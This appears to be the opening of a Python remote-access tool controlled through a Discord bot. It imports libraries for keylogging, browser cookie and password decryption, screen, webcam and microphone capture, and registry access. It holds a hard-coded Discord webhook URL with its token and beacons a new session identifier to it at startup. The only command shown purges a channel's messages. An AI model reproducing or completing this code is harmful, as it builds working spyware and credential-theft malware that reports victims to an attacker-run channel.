from pydub import AudioSegment
import win32clipboard as clipboard
import sqlite3
import pyperclip
import shutil
import socket
import pyautogui, threading, win32api, requests, base64, ctypes,win32crypt, browser_cookie3, inspect, urllib
from ctypes import Structure, c_uint
from re import findall
import sounddevice as sd
import tempfile
import webbrowser
from pynput import keyboard
import os
import getpass
from win32com.client import Dispatch
from pydub.playback import play
import tkinter
import tkinter.messagebox  # Import messagebox separately
import io
from base64 import b64decode
import subprocess
import discord
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir, getenv
from json import loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from datetime import datetime
from re import findall
import psutil
import requests
import pyautogui
import uuid
import cv2
import numpy as np
import sys
import wave
import pyaudio
import tkinter as tk
import asyncio
from discord.ext import commands
from PIL import ImageGrab
import winreg
from discord import FFmpegPCMAudio
import json
import random
import atexit  # For cleanup on exit

# Set up intents and bot
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='.', intents=intents)


active_sessions = {}

WEBHOOK_URL = "https://discord.com/api/webhooks/1319483520464191488/KVgxuoZAPPZtCcOq7hbVGr2FRWx4_2PYeBBF1IqsgJTvzVnxbdGUK07LofZuQ94dbCmV"

# Register a unique identifier when the script starts
if "current_identifier" not in globals():
    current_identifier = random.randint(10000, 99999)
    active_sessions[current_identifier] = True

    # Send the identifier to the webhook
    payload = {
        "content": f"New session registered with Identifier: **{current_identifier}**"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Failed to send identifier to webhook: {e}")

@bot.command()
async def delete(ctx):
    try:
        # Confirm deletion
        confirmation_message = await ctx.send("Are you sure you want to delete all applicable messages in this channel? Reply with `yes` to confirm.")
        
        def check(message):
            return message.author == ctx.author and message.channel == ctx.channel and message.content.lower() == "yes"

        # Wait for user confirmation
        await bot.wait_for('message', check=check, timeout=30)
        
        await ctx.send("Deleting all messages...")

        # Delete messages in the current channel
        deleted = await ctx.channel.purge()
        await ctx.send(f"Deleted {len(deleted)} messages in this channel.", delete_after=5)
    
    except asyncio.TimeoutError:
        await ctx.send("Deletion canceled: no confirmation received within 30 seconds.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
